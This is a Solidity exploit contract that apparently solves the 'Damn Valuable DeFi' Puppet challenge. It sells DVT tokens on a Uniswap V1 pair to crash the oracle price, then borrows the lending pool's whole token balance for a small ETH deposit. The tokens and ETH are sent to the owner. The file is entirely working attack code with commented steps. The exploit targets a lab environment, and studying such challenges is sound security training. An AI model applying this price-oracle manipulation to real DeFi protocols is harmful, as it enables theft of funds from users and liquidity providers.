// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../DamnValuableToken.sol";

interface IPuppetPool {
    function borrow(uint256 borrowAmount) external payable;

    function calculateDepositRequired(
        uint256 amount
    ) external view returns (uint256);
}

// see more at: https://docs.uniswap.org/contracts/v1/reference/interfaces
interface IUniswapV1 {
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256 eth_bought);
}

error AttackPuppetPool__OnlyOwner();
error AttackPuppetPool__ZeroTokens();
error AttackPuppetPool__NotEnoughEthSent();
error AttackPuppetPool__EthWithdrawalFailed();

contract AttackPuppetPool {
    address private owner;
    // address public immutable uniswapPair;

    IPuppetPool pool;
    DamnValuableToken token;
    IUniswapV1 uniswap;

    constructor(
        address _puppetPoolAddress,
        address _tokenAddress,
        address uniswapAddress
    ) {
        pool = IPuppetPool(_puppetPoolAddress);
        token = DamnValuableToken(_tokenAddress);
        uniswap = IUniswapV1(uniswapAddress);
        owner = msg.sender;
    }

    // to be able to receive ethers by calling swapDVTtoETH()
    receive() external payable {}

    function attack() external payable /*uint256 _amount*/ {
        if (msg.sender != owner) {
            revert AttackPuppetPool__OnlyOwner();
        }
        // 1. swap all DVT tokens to ETH on UniSwap to dump the price of DVT token
        swapDVTtoETH();
        // 2. borrow all tokens from pool
        uint256 tokenBalance = token.balanceOf(address(pool));
        uint256 tokenPrice = pool.calculateDepositRequired(tokenBalance);
        if (tokenPrice > msg.value) {
            revert AttackPuppetPool__NotEnoughEthSent();
        }
        pool.borrow{value: tokenPrice}(tokenBalance);
        // transfer all tokens to the attacker's EOA
        token.transfer(msg.sender, token.balanceOf(address(this)));
        // transfer all ETH to the attacker's EOA
        (bool success, ) = payable(owner).call{value: address(this).balance}(
            ""
        );
        if (!success) {
            revert AttackPuppetPool__EthWithdrawalFailed();
        }
    }

    function swapDVTtoETH() internal returns (uint256) {
        uint256 tokenBalance = token.balanceOf(address(this)) - 1; // extract 1 to met the successful exploit condition
        if (tokenBalance == 0) {
            revert AttackPuppetPool__ZeroTokens();
        }
        // approve tokens to uniswap
        token.approve(address(uniswap), tokenBalance);
        // swap tokens
        return
            uniswap.tokenToEthSwapInput(tokenBalance, 5, block.timestamp + 1);
    }
}
